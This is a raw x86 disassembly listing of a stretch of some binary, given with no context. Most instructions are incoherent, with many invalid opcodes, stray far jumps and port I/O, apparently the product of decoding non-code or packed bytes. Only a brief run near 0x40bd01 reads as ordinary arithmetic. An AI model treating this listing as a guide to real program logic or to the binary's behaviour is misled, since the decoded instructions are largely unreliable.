  40b98e:	and    dh,BYTE PTR [esi-0x25db8f7]
  40b994:	or     DWORD PTR [edx+0x4f],edx
  40b997:	retf   
  40b998:	imul   esi,ecx,0x6659d960
  40b99e:	das    
  40b99f:	inc    edi
  40b9a0:	and    edi,DWORD PTR [ecx-0x2c]
  40b9a3:	pop    edi
  40b9a4:	fsubrp st(3),st
  40b9a6:	push   0xd86a370d
  40b9ab:	sbb    al,0xf3
  40b9ad:	test   al,0x22
  40b9af:	xchg   ebx,eax
  40b9b0:	dec    ecx
  40b9b1:	dec    eax
  40b9b2:	dec    esi
  40b9b3:	mov    ch,BYTE PTR [ecx]
  40b9b5:	or     al,0xb8
  40b9b7:	pop    edx
  40b9b8:	and    bl,0xec
  40b9bb:	jl     0x40b9ae
  40b9bd:	cmc    
  40b9be:	les    ecx,FWORD PTR [edi]
  40b9c0:	out    0xd1,eax
  40b9c2:	push   cs
  40b9c3:	mov    edx,0x7aef5934
  40b9c8:	call   0xbcf2:0x1bc2a4fe
  40b9cf:	(bad)  
  40b9d1:	xlat   BYTE PTR ds:[ebx]
  40b9d2:	cs (bad) 
  40b9d5:	ds push ebp
  40b9d7:	ret    0xc676
  40b9da:	push   ecx
  40b9db:	mov    edi,DWORD PTR [esi]
  40b9dd:	(bad)  
  40b9de:	mul    DWORD PTR [ebx-0x8]
  40b9e1:	jo     0x40ba19
  40b9e3:	aad    0x4b
  40b9e5:	popf   
  40b9e6:	cmp    DWORD PTR [ebx+eiz*1+0x3e],esi
  40b9ea:	shl    BYTE PTR [eax],cl
  40b9ec:	clc    
  40b9ed:	push   ecx
  40b9ee:	pop    ebp
  40b9ef:	xchg   esi,eax
  40b9f0:	stos   DWORD PTR es:[edi],eax
  40b9f1:	into   
  40b9f2:	data16 (bad) 
  40b9f4:	cwde   
  40b9f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b9f6:	mov    esi,0xf8eebbe
  40b9fb:	fs and eax,0x53bc0523
  40ba01:	das    
  40ba02:	push   0x45
  40ba04:	pushf  
  40ba05:	les    esp,FWORD PTR [ecx+0xc]
  40ba08:	mov    al,ds:0x795a92fe
  40ba0d:	pop    esp
  40ba0e:	and    edi,DWORD PTR ds:0x6b61bda3
  40ba14:	mov    ah,BYTE PTR [ecx+0x8d451cd]
  40ba1a:	mov    ah,0xba
  40ba1c:	cmc    
  40ba1d:	ret    0x6f8d
  40ba20:	mov    esp,DWORD PTR [ecx+0x0]
  40ba23:	xchg   ecx,eax
  40ba24:	(bad)  
  40ba25:	popa   
  40ba26:	ja     0x40b9c6
  40ba28:	pop    eax
  40ba29:	cmc    
  40ba2a:	mov    edi,DWORD PTR [edx]
  40ba2c:	mov    cl,0x41
  40ba2e:	cmp    bh,BYTE PTR [ecx-0x6]
  40ba31:	aas    
  40ba32:	es pusha 
  40ba34:	pop    edx
  40ba35:	xor    edi,DWORD PTR [si]
  40ba38:	xor    eax,0x8264ba2b
  40ba3d:	gs mov al,0xd9
  40ba40:	imul   ebx,ebx,0xdf8f7c1e
  40ba46:	out    0x6c,eax
  40ba48:	dec    edx
  40ba49:	call   0xb220f1ac
  40ba4e:	sub    dh,ah
  40ba50:	cwde   
  40ba51:	mov    DWORD PTR [edx+0x2240a77f],0xf3346c1
  40ba5b:	inc    edi
  40ba5c:	or     eax,DWORD PTR [edi-0x59]
  40ba5f:	rol    bl,1
  40ba61:	push   esi
  40ba62:	leave  
  40ba63:	mov    dl,0x16
  40ba65:	lahf   
  40ba66:	aaa    
  40ba67:	clc    
  40ba68:	xchg   esp,eax
  40ba69:	inc    ebx
  40ba6a:	in     eax,0x6f
  40ba6c:	dec    eax
  40ba6d:	sbb    esi,DWORD PTR [esi-0x4a060d84]
  40ba73:	mov    ebx,0xc07132d7
  40ba78:	xchg   ebx,eax
  40ba79:	dec    edx
  40ba7a:	xor    al,0x71
  40ba7c:	in     eax,0xa6
  40ba7e:	in     al,0xcd
  40ba80:	jmp    0xe353:0x450a8b0e
  40ba87:	mov    esi,0x8493fec2
  40ba8c:	adc    cl,BYTE PTR [edi+0x3223a11f]
  40ba92:	fwait
  40ba93:	stos   DWORD PTR es:[edi],eax
  40ba94:	ja     0x40bb07
  40ba96:	ficomp DWORD PTR [edx+edi*4-0x1f]
  40ba9a:	dec    ebx
  40ba9b:	add    BYTE PTR [ebx],dh
  40ba9d:	cmp    DWORD PTR [ebx+ecx*8],0x71
  40baa1:	mov    ecx,0x1906246
  40baa6:	test   al,0x2c
  40baa8:	pop    edx
  40baa9:	les    ebx,FWORD PTR [edx-0x457019e6]
  40baaf:	rcr    DWORD PTR [edi-0x38],0x56
  40bab3:	mov    dl,0x21
  40bab5:	and    al,ch
  40bab7:	call   0xb4f2:0x1ec2136d
  40babe:	je     0x40bb09
  40bac0:	pop    esp
  40bac1:	cmp    eax,0x6afce71
  40bac6:	ds inc edi
  40bac8:	je     0x40ba5a
  40baca:	dec    edi
  40bacb:	pop    esp
  40bacc:	push   edi
  40bacd:	dec    esp
  40bace:	sbb    bl,ah
  40bad0:	bound  ebp,QWORD PTR [esi+0x19]
  40bad3:	ins    DWORD PTR es:[edi],dx
  40bad4:	or     al,0xa7
  40bad6:	outs   dx,BYTE PTR ds:[esi]
  40bad7:	jl     0x40bb03
  40bad9:	and    DWORD PTR [edx-0x57],0xffffffb8
  40badd:	out    0x9e,eax
  40badf:	mov    al,BYTE PTR [esi]
  40bae1:	jne    0x40bb0c
  40bae3:	mov    WORD PTR ds:0x717dd029,ds
  40bae9:	mov    eax,0x967252ec
  40baee:	sub    BYTE PTR [ecx+0x6ace1e8],bh
  40baf4:	add    al,BYTE PTR [ebp+0x4274e504]
  40bafa:	out    dx,eax
  40bafb:	dec    edx
  40bafc:	cmc    
  40bafd:	inc    ebx
  40bafe:	in     eax,dx
  40baff:	leave  
  40bb00:	out    dx,eax
  40bb01:	jecxz  0x40bb6b
  40bb03:	add    dh,BYTE PTR [edx-0x3f]
  40bb06:	call   0xa5567c64
  40bb0b:	test   al,0xf7
  40bb0d:	arpl   WORD PTR [esi],dx
  40bb0f:	data16 cli 
  40bb11:	out    0xee,al
  40bb13:	add    DWORD PTR [ebp-0x25],ecx
  40bb16:	ror    DWORD PTR [edx+0x3d],1
  40bb19:	or     dh,BYTE PTR [ecx+ebx*4-0x30]
  40bb1d:	les    edi,FWORD PTR [edx-0x56c42463]
  40bb23:	sti    
  40bb24:	sbb    ch,cl
  40bb26:	(bad)  
  40bb27:	push   eax
  40bb28:	xor    dl,BYTE PTR [ecx-0x32752dbe]
  40bb2e:	adc    DWORD PTR [edx],ebp
  40bb30:	mov    esi,ds
  40bb32:	pop    esp
  40bb33:	cs pop ecx
  40bb35:	xchg   edi,eax
  40bb36:	cmp    al,0x17
  40bb38:	push   0x8d8e0c07
  40bb3d:	or     eax,0x3bd5188b
  40bb42:	xor    DWORD PTR [eax-0x2e],eax
  40bb45:	in     al,dx
  40bb46:	(bad)  
  40bb47:	lock jmp 0x6f3b:0xe3b1b4b7
  40bb4f:	xchg   DWORD PTR [ebp+0x42],esp
  40bb52:	add    bl,BYTE PTR [esi-0x47]
  40bb55:	ins    BYTE PTR es:[edi],dx
  40bb56:	shr    DWORD PTR [edi],cl
  40bb58:	push   cs
  40bb59:	xchg   ebx,eax
  40bb5b:	and    DWORD PTR [ebx+0x4707c133],ecx
  40bb61:	rcl    cl,1
  40bb63:	push   esp
  40bb64:	sub    BYTE PTR [ebx+ecx*4],dl
  40bb67:	inc    ebx
  40bb68:	lods   eax,DWORD PTR ds:[esi]
  40bb69:	aaa    
  40bb6a:	out    dx,eax
  40bb6b:	xchg   esi,eax
  40bb6c:	retf   0x949f
  40bb6f:	jmp    0x40bb75
  40bb71:	sbb    BYTE PTR [ecx-0x3d7a55c9],cl
  40bb77:	cdq    
  40bb78:	jecxz  0x40bb36
  40bb7a:	dec    esp
  40bb7b:	jno    0x40bbee
  40bb7d:	adc    DWORD PTR [eax+0x14],0x406e52e5
  40bb84:	xlat   BYTE PTR ds:[ebx]
  40bb85:	shr    DWORD PTR [eax-0x27e3a903],0x8c
  40bb8c:	pop    edx
  40bb8d:	retf   0x1a77
  40bb90:	(bad)  
  40bb91:	adc    BYTE PTR [eax+0x6433fb8a],0xce
  40bb98:	xchg   esi,eax
  40bb99:	pop    esi
  40bb9a:	add    al,BYTE PTR [edx]
  40bb9c:	mov    al,ds:0x66917c8b
  40bba1:	mov    dh,0x1a
  40bba3:	mov    eax,0xe5ecc1c3
  40bba8:	push   edx
  40bba9:	add    eax,0x3a646e06
  40bbae:	je     0x40bc2f
  40bbb0:	mov    edx,0x1b555daa
  40bbb5:	nop
  40bbb6:	or     al,0xce
  40bbb8:	xchg   ecx,eax
  40bbb9:	sbb    eax,0x4cb0c75a
  40bbbe:	psrad  mm2,QWORD PTR [ebx+eiz*8]
  40bbc2:	xor    BYTE PTR [esi+0x43ef3226],ah
  40bbc8:	xchg   esi,eax
  40bbc9:	xor    eax,0xd9b5b783
  40bbce:	inc    esi
  40bbcf:	add    edx,DWORD PTR [eax+esi*1+0x2f]
  40bbd3:	cmp    ecx,ebx
  40bbd5:	repnz cmp al,0xfb
  40bbd8:	ret    
  40bbd9:	stos   BYTE PTR es:[edi],al
  40bbda:	push   ebx
  40bbdb:	dec    edx
  40bbdc:	jne    0x40bbbb
  40bbde:	ficomp DWORD PTR [edx]
  40bbe0:	repz leave 
  40bbe2:	adc    eax,0x875d0b59
  40bbe7:	je     0x40bbd0
  40bbe9:	dec    ebp
  40bbea:	xchg   edi,eax
  40bbeb:	fwait
  40bbec:	pop    ds
  40bbed:	aaa    
  40bbee:	fdivr  st,st(5)
  40bbf0:	adc    BYTE PTR [ebp+0x32],cl
  40bbf3:	daa    
  40bbf4:	mov    esi,0xe8d04be8
  40bbf9:	ss cdq 
  40bbfb:	rcr    BYTE PTR ds:0x538bfa9e,1
  40bc01:	les    esp,FWORD PTR [ecx-0x37af52e2]
  40bc07:	mov    eax,0x9fa2409f
  40bc0c:	pmaxsw mm3,QWORD PTR [esi-0x28aa942c]
  40bc13:	sub    eax,DWORD PTR [ecx]
  40bc15:	in     eax,dx
  40bc16:	jmp    0x40bc63
  40bc18:	call   0xc6f6:0xd1615dbf
  40bc1f:	sub    DWORD PTR [ebp+0x33],esp
  40bc22:	fwait
  40bc23:	nop
  40bc24:	mov    WORD PTR [bx+0x3b4e],gs
  40bc29:	jecxz  0x40bc34
  40bc2b:	jecxz  0x40bc88
  40bc2d:	leave  
  40bc2e:	pop    ebp
  40bc2f:	pushf  
  40bc30:	xchg   ebp,eax
  40bc31:	jne    0x40bc3d
  40bc33:	dec    ecx
  40bc34:	xchg   BYTE PTR [eax+0x72],bl
  40bc37:	(bad)  [edx+0x3d]
  40bc3a:	jmp    DWORD PTR [ebp-0x301d21e7]
  40bc40:	pop    es
  40bc41:	mov    edi,0x71198456
  40bc46:	dec    edx
  40bc47:	sbb    eax,0xbfbac38a
  40bc4c:	aas    
  40bc4d:	jnp    0x40bc3b
  40bc4f:	mov    DWORD PTR [ebx],edi
  40bc51:	pop    esp
  40bc52:	inc    BYTE PTR [eax-0x111e7e12]
  40bc58:	int    0x2
  40bc5a:	(bad)  
  40bc5b:	pushf  
  40bc5c:	fisub  WORD PTR [edx+edx*4+0x612b610d]
  40bc63:	adc    eax,0x507f8d2e
  40bc68:	jg     0x40bc7e
  40bc6a:	clc    
  40bc6b:	sbb    al,ch
  40bc6d:	fcom   DWORD PTR [ebp-0x74687ac7]
  40bc73:	cmp    al,ah
  40bc75:	ss jne 0x40bc72
  40bc78:	pop    ecx
  40bc7a:	push   ss
  40bc7b:	sub    dh,cl
  40bc7d:	sub    edi,DWORD PTR [edi-0x7a64ee6a]
  40bc83:	sub    ebp,DWORD PTR [esi+0x7ad0b9b5]
  40bc89:	(bad)  
  40bc8a:	pop    esp
  40bc8b:	mov    bl,0xe6
  40bc8d:	or     ebp,DWORD PTR [eax-0x3631509c]
  40bc93:	dec    edx
  40bc94:	sub    ebx,DWORD PTR [ecx]
  40bc96:	pop    edi
  40bc97:	(bad)  
  40bc98:	out    0xc5,eax
  40bc9a:	(bad)  
  40bc9b:	bound  eax,QWORD PTR [esi]
  40bc9d:	cdq    
  40bc9e:	sub    cl,dh
  40bca0:	xor    ebx,DWORD PTR [eax]
  40bca2:	cmp    DWORD PTR [eax],edx
  40bca4:	dec    edx
  40bca5:	xchg   edi,eax
  40bca6:	push   ds
  40bca7:	and    BYTE PTR [edi-0x5cbc8dd7],0x40
  40bcae:	mov    eax,ds:0xf2828dff
  40bcb3:	rcr    BYTE PTR [esi-0x73],0x73
  40bcb7:	cmp    DWORD PTR [edx+0x79d04d3],ebp
  40bcbd:	inc    ebx
  40bcbe:	(bad)  
  40bcbf:	fadd   QWORD PTR ds:0x7559d1ec
  40bcc5:	es mov ecx,0x3e138383
  40bccb:	idiv   BYTE PTR [edi+0x1f7494cc]
  40bcd1:	inc    esi
  40bcd2:	or     BYTE PTR [esi],ah
  40bcd4:	xchg   ecx,eax
  40bcd5:	test   DWORD PTR [ecx-0x4a85197a],0x67c788e1
  40bcdf:	out    dx,eax
  40bce0:	stos   BYTE PTR es:[edi],al
  40bce1:	callw  0x34e1
  40bce5:	mov    al,ds:0x8f6cd627
  40bcea:	ins    BYTE PTR es:[edi],dx
  40bceb:	mov    bh,BYTE PTR [edi+eiz*4-0x30]
  40bcef:	int    0x5
  40bcf1:	jmp    0x40bd1d
  40bcf3:	ror    DWORD PTR [ebx-0x20d40fa3],cl
  40bcf9:	cmp    ebx,edx
  40bcfb:	ja     0x40bd09
  40bd01:	mov    edx,DWORD PTR [ebp-0x34]
  40bd04:	jmp    0x40c0ee
  40bd09:	mov    edx,DWORD PTR [ebp-0x3c]
  40bd0c:	mov    edi,DWORD PTR [ebp-0x4]
  40bd0f:	xor    edx,eax
  40bd11:	xor    edi,eax
  40bd13:	add    edx,ecx
  40bd15:	add    edi,ecx
  40bd17:	imul   edx,edi
  40bd1a:	mov    edi,DWORD PTR [ebp-0x8]
  40bd1d:	mov    ebx,DWORD PTR [ebp-0x10]
  40bd20:	sub    ebx,edi
  40bd22:	cmp    ebx,edx
  40bd24:	mov    edx,DWORD PTR [ebp-0x38]
  40bd27:	jbe    0x40c0ee
  40bd2d:	jmp    0x40c0eb
  40bd32:	xchg   edx,eax
  40bd33:	dec    edx
  40bd34:	inc    edx
  40bd35:	inc    esp
  40bd36:	inc    edx
  40bd37:	push   esp
  40bd38:	xchg   edx,eax
  40bd39:	dec    edx
  40bd3a:	fdiv   DWORD PTR [edx+edi*8]
  40bd3d:	adc    al,BYTE PTR [eax+0x6f]
  40bd40:	aaa    
  40bd41:	pop    ds
  40bd42:	(bad)  
  40bd43:	(bad)  
  40bd44:	jo     0x40bdb6
  40bd46:	lahf   
  40bd47:	jge    0x40bdb9
  40bd49:	jo     0x40bd0b
  40bd4b:	jmp    0x3fc973cd
  40bd50:	jne    0x40bd01
  40bd52:	mov    esp,0xb5e46e9
  40bd57:	cmp    dl,BYTE PTR [esi+0x14a94684]
  40bd5d:	or     ecx,ebx
  40bd5f:	repnz or ecx,DWORD PTR [edi+0x77]
  40bd63:	xor    ecx,DWORD PTR [eax+0x7880bd94]
  40bd69:	stos   BYTE PTR es:[edi],al
  40bd6a:	cmp    al,bl
  40bd6c:	not    BYTE PTR [eax-0x41b244a6]
  40bd72:	mov    al,0x9c
  40bd74:	mul    DWORD PTR [ebp+0x7e]
  40bd77:	pushf  
  40bd78:	push   eax
  40bd79:	xor    eax,0x426f655a
  40bd7e:	xchg   BYTE PTR [edi],cl
  40bd80:	fdiv   QWORD PTR [esi-0x3]
  40bd83:	jg     0x40bd50
  40bd85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd86:	nop
  40bd87:	xchg   DWORD PTR [edx+ebp*8-0xa298fb0],eax
  40bd8e:	jecxz  0x40be0e
  40bd90:	ret    0x877a
  40bd93:	dec    ebp
  40bd94:	mov    WORD PTR [esi+0x503a8767],?
  40bd9a:	neg    edx
  40bd9c:	popa   
  40bd9d:	cdq    
  40bd9e:	int3   
  40bd9f:	mov    esp,0x80f3aa33
  40bda4:	mov    DWORD PTR [esp+eiz*4],ebx
  40bda7:	ficom  WORD PTR cs:[ecx+ecx*8]
  40bdab:	and    eax,0x6fc24635
  40bdb0:	retf   
  40bdb1:	jmp    0x3522:0x60ba5dcc
  40bdb8:	bound  ebx,QWORD PTR ds:0x7fabdcd
  40bdbe:	push   0xd9a4e223
  40bdc3:	or     al,0x1f
  40bdc5:	das    
  40bdc6:	ds xchg ebx,eax
  40bdc8:	das    
  40bdc9:	mov    ah,0xa1
  40bdcb:	xor    dh,BYTE PTR [ebp-0x6ea8349e]
  40bdd1:	mov    DWORD PTR [edx],edi
  40bdd3:	mov    bh,0x9e
  40bdd5:	add    al,BYTE PTR [eax]
  40bdd7:	bndldx bnd2,[ecx]
  40bdda:	inc    ebx
  40bddb:	and    al,0xf0
  40bddd:	jecxz  0x40be2e
  40bddf:	sbb    BYTE PTR [ebp+0x70],ch
  40bde2:	(bad)  
  40bde3:	sub    eax,0x124ce3d4
  40bde8:	inc    eax
  40bde9:	popa   
  40bdea:	push   0x313b7c8d
  40bdef:	mov    cl,0xd1
  40bdf1:	pop    es
  40bdf2:	pop    ebp
  40bdf3:	mov    ds:0xbb506a88,al
  40bdf8:	inc    edi
  40bdf9:	jecxz  0x40be05
  40bdfb:	in     eax,0x46
  40bdfd:	or     al,0x47
  40bdff:	jns    0x40be7a
  40be01:	out    dx,al
  40be02:	outs   dx,DWORD PTR ds:[esi]
  40be03:	mov    ebp,0xb85a1f37
  40be08:	xchg   ecx,eax
  40be09:	and    BYTE PTR [eax-0x76a6e11c],dl
  40be0f:	call   DWORD PTR [edi-0x4c2f430b]
  40be15:	and    ebx,DWORD PTR [ebp+ebx*2+0x6f]
  40be19:	dec    ecx
  40be1a:	sbb    DWORD PTR [edx],0x36cea579
  40be20:	push   edi
  40be21:	sub    BYTE PTR [ebx],0xf2
  40be24:	(bad)  
  40be25:	jbe    0x40be47
  40be27:	outs   dx,DWORD PTR ds:[esi]
  40be28:	pop    esi
  40be29:	outs   dx,DWORD PTR ds:[esi]
  40be2a:	nop
  40be2b:	in     al,dx
  40be2c:	das    
  40be2d:	or     bl,BYTE PTR [edi]
  40be2f:	arpl   WORD PTR [edx-0x5412b50c],si
  40be35:	xchg   esp,eax
  40be36:	dec    esp
  40be37:	leave  
  40be38:	dec    edx
  40be39:	mov    BYTE PTR [eax-0x51],ah
  40be3c:	stos   DWORD PTR es:[edi],eax
  40be3d:	cdq    
  40be3e:	mov    eax,ds:0x7f2fa67d
  40be43:	scas   al,BYTE PTR es:[edi]
  40be44:	fcomp  st(6)
  40be46:	pop    esi
  40be47:	dec    edi
  40be48:	inc    eax
  40be49:	inc    esi
  40be4a:	fmul   DWORD PTR [esi+edi*8-0x1a]
  40be4e:	addr16 push es
  40be50:	popa   
  40be51:	push   ebp
  40be52:	mov    DWORD PTR [ebx+0x50],eax
  40be55:	shr    DWORD PTR [esp+esi*1],0xde
  40be59:	fild   QWORD PTR [ecx]
  40be5b:	stos   DWORD PTR es:[edi],eax
  40be5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be5d:	xor    al,0x6e
  40be5f:	loopne 0x40be9a
  40be61:	add    cl,BYTE PTR [ecx+0x1a447c6b]
  40be67:	lds    ebp,FWORD PTR [edi]
  40be69:	(bad)  
  40be6a:	dec    ebp
  40be6b:	rcr    DWORD PTR [edi-0x6b],cl
  40be6e:	imul   eax,ecx,0x5159894b
  40be74:	sub    al,0x10
  40be76:	scas   eax,DWORD PTR es:[edi]
  40be77:	adc    al,0x49
  40be79:	fisubr DWORD PTR [esi+edx*4-0x11]
  40be7d:	sbb    al,BYTE PTR [esi]
  40be7f:	push   ss
  40be80:	xchg   esi,eax
  40be81:	xchg   ecx,eax
  40be82:	cwde   
  40be83:	(bad)  
  40be84:	hlt    
  40be85:	fwait
  40be86:	aam    0x19
  40be88:	popf   
  40be89:	pop    edx
  40be8a:	mov    ds:0xf9d4ed89,al
  40be8f:	rcr    edi,1
  40be91:	adc    esi,DWORD PTR [ebx]
  40be93:	mov    DWORD PTR [eax+0x2b],ecx
  40be96:	fsubr  QWORD PTR [ebx-0x48]
  40be99:	test   eax,0x7be523d2
  40be9e:	ins    BYTE PTR es:[edi],dx
  40be9f:	test   dl,bl
  40bea1:	jmp    0xe223fd4f
  40bea6:	clc    
  40bea7:	jmp    edx
  40bea9:	xor    ah,BYTE PTR [eax-0x49c03a30]
  40beaf:	je     0x40bf02
  40beb1:	xor    edx,esi
  40beb3:	push   ebx
  40beb4:	(bad)  
  40beb5:	xchg   ebp,eax
  40beb6:	and    BYTE PTR [ecx+0x6e],0xb5
  40beba:	xchg   edi,eax
  40bebb:	cld    
  40bebc:	iret   
  40bebd:	dec    esp
  40bebe:	mov    al,0x74
  40bec0:	jnp    0x40beb4
  40bec2:	mov    eax,0xe4acd63c
  40bec7:	nop
  40bec8:	out    dx,al
  40bec9:	dec    ecx
  40beca:	sbb    al,0xf7
  40becc:	and    ecx,esp
  40bece:	mov    esp,0xf28331bc
  40bed3:	xchg   esi,eax
  40bed4:	add    ebx,eax
  40bed6:	pop    edi
  40bed7:	add    al,0x8b
  40bed9:	xchg   ecx,eax
  40beda:	dec    ebp
  40bedb:	inc    eax
  40bedc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bedd:	push   ecx
  40bede:	ins    DWORD PTR es:[edi],dx
  40bedf:	jle    0x40bee8
  40bee1:	or     esp,edx
  40bee3:	inc    edi
  40bee4:	or     BYTE PTR [ebx-0x64],cl
  40bee7:	pusha  
  40bee8:	mov    edi,0xf11bd229
  40beed:	pop    ecx
  40beee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40beef:	add    DWORD PTR [ebx-0x33d0d405],edx
  40bef5:	xor    dl,BYTE PTR [eax]
  40bef7:	xchg   DWORD PTR [ebp-0x3343ee61],eax
  40befd:	lahf   
  40befe:	sbb    al,cl
  40bf00:	loope  0x40bf0f
  40bf02:	and    eax,0x44771a89
  40bf07:	xor    BYTE PTR [eax+0xa],0xa6
  40bf0b:	sub    BYTE PTR [ebx],0x2c
  40bf0e:	sbb    dl,BYTE PTR [eax+0x7c8de5e0]
  40bf14:	stos   BYTE PTR es:[edi],al
  40bf15:	and    edi,DWORD PTR [eax+0x27ed413a]
  40bf1b:	pop    edx
  40bf1c:	dec    eax
  40bf1d:	or     bl,cl
  40bf1f:	and    eax,0x32858251
  40bf24:	pop    es
  40bf25:	mov    cl,0x85
  40bf27:	jle    0x40bf17
  40bf29:	(bad)  
  40bf2a:	mov    ebx,0xeb32512
  40bf2f:	pop    esp
  40bf30:	pop    edx
  40bf31:	fsin   
  40bf33:	push   0x2f
  40bf35:	pop    ds
  40bf36:	pushf  
  40bf37:	stos   BYTE PTR es:[edi],al
  40bf38:	shr    DWORD PTR ds:0x384801a4,0xa6
  40bf3f:	je     0x40bf2f
  40bf41:	sub    edi,DWORD PTR [ebx+edi*2+0x4d98166]
  40bf48:	imul   edx
  40bf4a:	std    
  40bf4b:	push   esp
  40bf4c:	mov    esi,0x942e86ca
  40bf51:	and    BYTE PTR [esi],0x61
  40bf54:	jl     0x40bf03
  40bf56:	jmp    0x40bf09
  40bf58:	ss dec edi
  40bf5a:	lahf   
  40bf5b:	pop    esi
  40bf5c:	in     eax,dx
  40bf5d:	hlt    
  40bf5e:	push   ecx
  40bf5f:	in     eax,0x88
  40bf61:	sub    DWORD PTR [ecx],eax
  40bf63:	fdivr  QWORD PTR [edx]
  40bf65:	fnstcw WORD PTR [edi+0x38]
  40bf68:	pop    ebx
  40bf69:	sti    
  40bf6a:	cmp    eax,0x3c4eba9c
  40bf6f:	jecxz  0x40bfe3
  40bf71:	nop
  40bf72:	sbb    BYTE PTR [ebp+0x20fa94c3],al
  40bf78:	aaa    
  40bf79:	leave  
  40bf7a:	inc    BYTE PTR [esi]
  40bf7c:	xor    esi,DWORD PTR [ebx+0x522c8141]
  40bf82:	xor    al,0x2b
  40bf84:	cmp    DWORD PTR [eax],ebx
  40bf86:	stc    
  40bf87:	mov    ds:0x507a0a00,eax
  40bf8c:	pop    esp
  40bf8d:	mov    BYTE PTR [esi-0x43],ch
  40bf90:	push   es
  40bf91:	xor    ebp,DWORD PTR [eax]
  40bf93:	in     eax,dx
  40bf94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf95:	mov    ds:0x17f22139,eax
  40bf9a:	rol    DWORD PTR [esi],1
  40bf9c:	fstp   DWORD PTR [eax]
  40bf9e:	xchg   ebx,eax
  40bf9f:	or     BYTE PTR [esi+0x6a],bl
  40bfa2:	loope  0x40bfcb
  40bfa4:	pop    ecx
  40bfa5:	and    bl,BYTE PTR [esi-0x11d6fd3]
  40bfab:	xor    bp,cx
  40bfae:	sar    BYTE PTR [edx],1
  40bfb0:	dec    edx
  40bfb1:	xchg   esi,eax
  40bfb2:	rcl    BYTE PTR [edx-0x603d2bc6],0xa4
  40bfb9:	dec    ecx
  40bfba:	mov    dh,0x3f
  40bfbc:	mov    ebp,0xaa150194
  40bfc1:	push   edx
  40bfc2:	jle    0x40bf93
  40bfc4:	sub    eax,0x21568aa6
  40bfc9:	out    dx,al
  40bfca:	test   DWORD PTR [ecx],ebp
  40bfcc:	xor    BYTE PTR [edi+0x59],0xd9
  40bfd0:	sub    BYTE PTR [ebx+ebx*1],al
  40bfd3:	ret    0xb060
  40bfd6:	das    
  40bfd7:	xor    BYTE PTR [edx],al
  40bfd9:	push   esp
  40bfda:	sbb    cl,cl
  40bfdc:	mov    cl,0x77
  40bfde:	xchg   ebp,eax
  40bfdf:	ins    BYTE PTR es:[edi],dx
  40bfe0:	retf   0x3b6f
  40bfe3:	pop    ebp
  40bfe4:	jmp    edi
  40bfe6:	xor    bh,dl
  40bfe8:	dec    ecx
  40bfe9:	out    dx,al
  40bfea:	fldenv [esi]
  40bfec:	cmp    BYTE PTR ds:0x45c4b179,dl
  40bff2:	adc    al,0x4
  40bff4:	push   0xa07f3e6
  40bff9:	jmp    0x4716:0xeba1c4b3
  40c000:	fwait
  40c001:	mov    edi,0x4345965e
  40c006:	mov    dl,0x2
  40c008:	(bad)  
  40c009:	mov    ah,0xbe
  40c00b:	cmc    
  40c00c:	mov    eax,0xbefd2a65
  40c011:	fsub   DWORD PTR [edx+0xf]
  40c014:	test   dl,ah
  40c016:	inc    edx
  40c017:	xor    DWORD PTR [ecx],esp
  40c019:	rcl    BYTE PTR [ecx+0x5edb1589],0x50
  40c020:	in     al,dx
  40c021:	jnp    0x40bfb9
  40c023:	sbb    dl,bl
  40c025:	jg     0x40c092
  40c027:	(bad)  
  40c029:	fisttp QWORD PTR [eax-0x6a]
  40c02c:	(bad)  
  40c02d:	js     0x40c091
  40c02f:	mov    edi,0xbc1fd18b
  40c034:	adc    edx,eax
  40c036:	scas   al,BYTE PTR es:[edi]
  40c037:	out    dx,al
  40c038:	pop    ecx
  40c039:	cs popa 
  40c03b:	stos   BYTE PTR es:[edi],al
  40c03c:	sub    DWORD PTR [edx-0xe],0x77eae1a5
  40c043:	mov    al,0x2b
  40c045:	push   es
  40c046:	mov    BYTE PTR [ecx+0x37ffeafd],bh
  40c04c:	mov    esp,0xdd05955c
  40c051:	mov    ecx,0x8ff7fd82
  40c056:	xor    ebp,DWORD PTR [esi+0x55ef301c]
  40c05c:	push   ds
  40c05d:	ins    DWORD PTR es:[edi],dx
  40c05e:	push   ecx
  40c05f:	lods   eax,DWORD PTR ds:[esi]
  40c060:	(bad)  
  40c061:	sbb    bh,bl
  40c063:	cs sahf 
  40c065:	imul   esp,DWORD PTR [edi],0x4e1dcb39
  40c06b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c06c:	outs   dx,BYTE PTR ds:[esi]
  40c06d:	cmc    
  40c06e:	aad    0x3b
  40c070:	shr    DWORD PTR [edi+0x7f],1
  40c073:	xor    BYTE PTR [eax],bh
  40c075:	daa    
  40c076:	in     eax,0xd1
  40c078:	push   eax
  40c079:	cmp    al,0xcc
  40c07b:	ficom  DWORD PTR [ecx]
  40c07d:	adc    ecx,DWORD PTR [esi]
  40c07f:	xchg   BYTE PTR [eax+ecx*2-0x20],ah
  40c083:	pop    ss
  40c084:	add    dh,ah
  40c086:	adc    al,0xfd
  40c088:	les    ebx,FWORD PTR [edx+0x4f]
  40c08b:	mov    DWORD PTR [ecx+0x440787c0],ebx
  40c091:	sub    DWORD PTR [edi-0x40],0xffffffc9
  40c095:	ins    DWORD PTR es:[edi],dx
  40c096:	push   ss
  40c097:	test   dl,al
  40c099:	pop    ss
  40c09a:	fld    DWORD PTR [esi+0x612e51ae]
  40c0a0:	iret   
  40c0a1:	lahf   
  40c0a2:	mov    bh,0xa4
  40c0a4:	sbb    ch,dl
  40c0a6:	test   BYTE PTR [esi],cl
  40c0a8:	add    al,0x53
  40c0aa:	lods   al,BYTE PTR ds:[esi]
  40c0ab:	mov    DWORD PTR [ecx],edx
  40c0ad:	les    edx,FWORD PTR [ecx-0x279ed6c0]
  40c0b3:	pop    esp
  40c0b4:	push   edx
  40c0b5:	jnp    0x40c038
  40c0b7:	dec    edi
  40c0b8:	dec    edx
  40c0b9:	dec    edi
  40c0ba:	shl    BYTE PTR [esi-0x34e5d42e],cl
  40c0c0:	push   es
  40c0c1:	rol    ecx,0x67
  40c0c4:	push   DWORD PTR [eax+0xa]
  40c0c7:	xor    ebp,edi
  40c0c9:	stos   DWORD PTR es:[edi],eax
  40c0ca:	or     al,BYTE PTR [edx]
  40c0cc:	scas   al,BYTE PTR es:[edi]
